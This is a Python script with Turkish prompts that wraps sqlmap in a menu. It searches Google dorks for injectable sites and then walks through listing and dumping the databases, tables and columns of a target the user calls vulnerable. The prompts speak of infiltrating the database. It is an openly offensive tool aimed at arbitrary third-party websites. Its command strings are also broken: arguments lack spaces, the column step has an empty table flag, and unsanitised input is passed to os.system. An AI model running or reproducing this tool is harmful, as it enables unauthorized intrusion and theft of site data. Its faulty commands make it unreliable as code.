#coded by pikarun

#! usr/bin/env/python
# *- coding: utf-8 -*-

import os
import time
import webbrowser
from colorama import Fore, Style, init

init(autoreset=True)

print(Fore.BLUE +  """   (           (       *             (     
 )\ )   (    )\ )  (  `     (      )\ )  
(()/( ( )\  (()/(  )\))(    )\    (()/(  
 /(_)))((_)  /(_))((_)()\((((_)(   /(_)) 
(_)) ((_)_  (_))  (_()((_))\ _ )\ (_))   
/ __| / _ \ | |   |  \/  |(_)_\(_)| _ \  
\__ \| (_) || |__ | |\/| | / _ \  |  _/  
|___/ \__\_\|____||_|  |_|/_/ \_\ |_|  

""" + Style.RESET_ALL)

bilgilendirme = "MERHABA BEN PİKARUN.BU TOOLUN AMACI SQLMAP TOOLUNU  DAHA KOLAY KULLANMANIZ İÇİN GELİŞTİRİLDİ"
 
print(Fore.RED + bilgilendirme + Style.RESET_ALL)
print(Fore.MAGENTA + "LÜTFEN BEKLEYİNİZ TOOLA GİRİŞ YAPILIYOR..." + Style.RESET_ALL)
time.sleep(3)

os.system("clear")

print(Fore.BLUE +  """   (           (       *             (     
 )\ )   (    )\ )  (  `     (      )\ )  
(()/( ( )\  (()/(  )\))(    )\    (()/(  
 /(_)))((_)  /(_))((_)()\((((_)(   /(_)) 
(_)) ((_)_  (_))  (_()((_))\ _ )\ (_))   
/ __| / _ \ | |   |  \/  |(_)_\(_)| _ \  
\__ \| (_) || |__ | |\/| | / _ \  |  _/  
|___/ \__\_\|____||_|  |_|/_/ \_\ |_|  

""" + Style.RESET_ALL)



print(Fore.MAGENTA + """

1-DORK SCAN 

2-SQLMAP

3-TOOLDAN ÇIKIŞ YAP

""" + Style.RESET_ALL)

while True:
	islem_secim = input(Fore.CYAN + "Yapmak İstediğiniz İşlemin Rakamını Girin: " + Style.RESET_ALL)

	def dork_scan(): 
		print(Fore.CYAN + "\n \n  Örnek : \n games.php?id=\n \n  newsDetail.php?id=\n \n  view.php?id= \n \n " + Style.RESET_ALL )
		dork_scan = input(Fore.BLUE + "Lütfen Taramak İstediğiniz Dorku Yazın: " + Style.RESET_ALL)
		os.system("sqlmap -g " + dork_scan )

	def sqlmap():
		sql_scan = input(Fore.YELLOW + "SQL Açıklı Siteyi Yazın: " + Style.RESET_ALL)
		os.system ("sqlmap -u " + sql_scan + "--batch " +  "--dbs ")
		
		devam = input(Fore.CYAN + "DEVAM ETMEK İSTİYOR MUSUNUZ? [E/H]  " + Style.RESET_ALL)
		
		if devam.upper() == "E":
			database = input(Fore.CYAN + "Sızmak İstediğiniz Database Adını Girin: " + Style.RESET_ALL)
			os.system("sqlmap -u " + sql_scan + "--batch" + " -D "  + database  + "--tables")
				
		elif devam.upper()  == "H":
			print(Fore.RED + "TOOLDAN ÇIKIŞ YAPILIYOR... " + Style.RESET_ALL)
			time.sleep(2)
			return
		else:
			print(Fore.CYAN + "HATALI SEÇİM " + Style.RESET_ALL)		

		
		
		
		
		tablo = input(Fore.RED + "Tablo Adını Yazın:" + Style.RESET_ALL)
		os.system("sqlmap -u " + sql_scan  + " --batch " +  "-D " + database + "-T " + "--columns")
	
		
		dumped = input(Fore.CYAN + " Dump Edilecek Veriy Girin: " + Style.RESET_ALL)
		os.system ("sqlmap -u " + sql_scan + " --batch  " + "-D "   + database + "-T" + tablo + "-C " +  dumped +  "--dump")
			
		

		print(Fore.RED + "iŞLEMLER TAMAMLANDI " + Style.RESET_ALL)

	if islem_secim == "1":	
		dork_scan()
	
	elif islem_secim == "2":
		sqlmap()
	elif islem_secim == "3":
		print(Fore.RED + "TOOLDAN ÇIKIŞ YAPILIYOR ..." + Style.RESET_ALL)
		time.sleep(0.50)
		break
	else:
		print(Fore.MAGENTA + "HATALI SEÇİM YAPTINIZ " )

			
